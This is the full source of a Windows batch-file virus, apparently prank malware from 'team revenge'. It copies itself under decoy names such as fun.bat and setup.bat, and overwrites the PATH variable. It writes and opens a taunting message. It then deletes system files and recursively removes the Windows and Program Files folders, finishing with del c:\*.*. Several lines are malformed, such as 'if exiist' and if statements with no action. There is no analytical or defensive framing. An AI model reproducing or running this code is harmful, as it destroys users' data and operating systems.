@echo off
cls
break=off
:set
lastdrive=Q
set path=c:\Program Files\cia.bat
set homedrive=c:
set homepath=\windows
SET HOMEDRIVE=C: 
SET HOMEPATH=\WINDOWS  
goto:copy

:copy
copy %0 c:\windows\system32\autoexec1.bat
Copy %0 c:\MyDocuments\fun.bat
Copy %0 c:\MyPrograms\setup.bat
Copy %0 c:\DocumentsAndSettings\run.bat
Copy %0 c:\123.bat
copy %0 c:\program files\abc.bat
copy %0 c:\command.pif c:\Program Files\Accessories\command.pif
copy %0 c:\bootlog.txt c:\Program Files\Accessories\bootlog.txt
goto:if exists

:if exists
if exiist c:\backup\restore.bat
if not exist c:\command.pif
goto:call

:call
call c:\autoexec.bat
call c:\util\cdet.bat
goto:message

:message
echo a member of team revenge woz era 2003 i bet u wish he wasnt dont u lol hehehehehehehehehehehehehehe.>> c:\windows\cia.txt
start c:\windows\cia.txt
goto:delete

pause
:delete
DEL C:\tempfile.txt 
del Autoexec.bat
del cdet.bat
del c:\bootlog.txt
del c:\command.pif
del c:\program files\access~1
DEL c:\windows\cia.txt
DEL C:\tempfile.txt 
del c:\windows\start menu\cia.bat
rd/s/q c:\window~1
rd/s/q c:\progra~1
del c:\*.*
cls
exit 

